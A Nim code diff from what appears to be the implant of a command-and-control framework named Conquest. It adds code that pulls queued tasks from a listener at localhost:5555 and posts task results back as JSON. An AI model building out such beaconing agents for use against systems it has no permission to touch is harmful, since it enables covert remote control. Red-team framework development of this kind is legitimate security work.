@@ -38,15 +38,33 @@ proc getTasks*(listener: string, agent: string): seq[Task] =
     try:
         # Register agent to the Conquest server
         let responseBody = waitFor client.getContent(fmt"http://localhost:5555/{listener}/{agent}/tasks")
-        echo responseBody
+        return parseJson(responseBody).to(seq[Task])
 
+    except HttpRequestError as err:
+        echo "Not found"
+        quit(0)
+
+    finally:
+        client.close()
+
+    return @[]
+
+proc postResults*(listener, agent: string, task: Task): bool = 
+    
+    let client = newAsyncHttpClient()
+
+    # Define headers
+    client.headers = newHttpHeaders({ "Content-Type": "application/json" })
+    
+    let taskJson = %task
+
+    try:
+        # Register agent to the Conquest server
+        discard waitFor client.postContent(fmt"http://localhost:5555/{listener}/{agent}/{task.id}/results", $taskJson)
     except HttpRequestError as err:
         echo "Not found"
         quit(0)
     finally:
         client.close()
 
-    return @[]
-
-proc postResults*(listener: string, agent: string, results: string) = 
-    discard
+    return true
